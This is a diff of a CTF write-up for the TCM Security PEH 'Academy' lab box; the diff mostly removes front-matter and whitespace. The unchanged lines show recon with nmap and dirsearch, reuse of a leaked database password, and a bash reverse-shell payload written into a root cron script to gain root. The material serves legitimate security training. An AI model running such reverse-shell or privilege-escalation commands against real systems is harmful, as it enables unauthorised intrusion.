@@ -4,26 +4,7 @@ description: "Solution for the Academy Box of Capstone challenges from the PEH c
 summary: "Solution for the Academy Box of Capstone challenges from the PEH course of TCM Security."
 date: 2024-02-04
 draft: false
-author: "Aftab Sama" # ["Me", "You"] # multiple authors
 tags: ["Web", "CTF", "Linux"]
-canonicalURL: ""
-showToc: false
-TocOpen: false
-TocSide: 'right'  # or 'left'
-# weight: 1
-# aliases: ["/first"]
-hidemeta: false
-comments: true
-disableHLJS: true # to disable highlightjs
-disableShare: true
-hideSummary: false
-searchHidden: false
-ShowReadingTime: true
-ShowBreadCrumbs: true
-ShowPostNavLinks: true
-ShowWordCount: true
-ShowRssButtonInSectionTermList: true
-# UseHugoToc: true
 ---
 
 ------------------------
@@ -47,7 +28,7 @@ After starting the target VM.
 
 Now that we have the target IP `192.168.0.113` let's run the `nmap`.
 
-```bash                                                                                                           
+```bash
 ┌──(Jack㉿Sparrow)-[~/Downloads]
 └─$  nmap -sC -sV -T5 192.168.0.113 -oA nmap_Academy.txt -Pn
 Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-02 13:58 EST
@@ -59,8 +40,8 @@ PORT     STATE    SERVICE       VERSION
 21/tcp   open     ftp           vsftpd 3.0.3
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
-| ftp-syst: 
-|   STAT: 
+| ftp-syst:
+|   STAT:
 | FTP server status:
 |      Connected to ::ffff:192.168.0.207
 |      Logged in as ftp
@@ -73,7 +54,7 @@ PORT     STATE    SERVICE       VERSION
 |      vsFTPd 3.0.3 - secure, fast, stable
 |_End of status
 22/tcp   open     ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 c744588690fde4de5b0dbf078d055dd7 (RSA)
 |   256 78ec470f0f53aaa6054884809476a623 (ECDSA)
 |_  256 999c3911dd3553a0291120c7f8bf71a4 (ED25519)
@@ -91,7 +72,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.39 seconds
 ```
 
 
-Here we see that port `21,22,80` are open. 
+Here we see that port `21,22,80` are open.
 
 In port 21 Anonymous FTP login is allowed  \
 to see what files are present in this ftp we can open `ftp://192.168.0.113/` in windows File Explorer or we can also use curl
@@ -118,11 +99,11 @@ There is nothing much to see in this default page so let's do the directory brut
 
 ```bash
 ┌──(Jack㉿Sparrow)-[~]
-└─$ dirsearch -u http://192.168.0.113/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
+└─$ dirsearch -u http://192.168.0.113/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 
   _|. _ _  _  _  _ _|_    v0.4.2
  (_||| _) (/_(_|| (_| )
-                                                                                                                                                                                                                                            
+
 Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 141672
 
 Output File: /home/kali/.dirsearch/reports/192.168.0.113/-_24-02-04_03-17-49.txt
@@ -131,10 +112,10 @@ Error Log: /home/kali/.dirsearch/logs/errors-24-02-04_03-17-49.log
 
 Target: http://192.168.0.113/
 
-[03:17:49] Starting: 
+[03:17:49] Starting:
 [03:18:19] 301 -  319B  - /phpmyadmin  ->  http://192.168.0.113/phpmyadmin/
-[03:19:57] 301 -  316B  - /academy  ->  http://192.168.0.113/academy/       
-                                                                              
+[03:19:57] 301 -  316B  - /academy  ->  http://192.168.0.113/academy/
+
 Task Completed
 ```
 
@@ -165,7 +146,7 @@ reference: https://www.revshells.com
 ![image](md/4cf54a48-a797-4c62-ae47-f0e3a7fa91a5.webp)
 
 
-In the config.php file we have the mysql_password `My_V3ryS3cur3_P4ss` and in the ftp note we show line `I told him not to use the same password everywhere` which implies 
+In the config.php file we have the mysql_password `My_V3ryS3cur3_P4ss` and in the ftp note we show line `I told him not to use the same password everywhere` which implies
 that user Grimmie is reusing the same password so we can try to use this password to switch to user Grimmie.
 
 ![image](md/a6efd8be-7132-4ee9-86b2-b44bcb917ba6.webp)
@@ -176,7 +157,7 @@ looking at crontab we notice that `/home/grimmie/backup.sh` file is running as r
 ![image](md/ee82ccab-380c-485d-855c-247e8e2e7dcc.webp)
 
 
-Reverse shell payload to get shell as root: 
+Reverse shell payload to get shell as root:
 
 `echo 'bash -c "bash -i >& /dev/tcp/192.168.0.207/9002 0>&1"' > backup.sh`
 
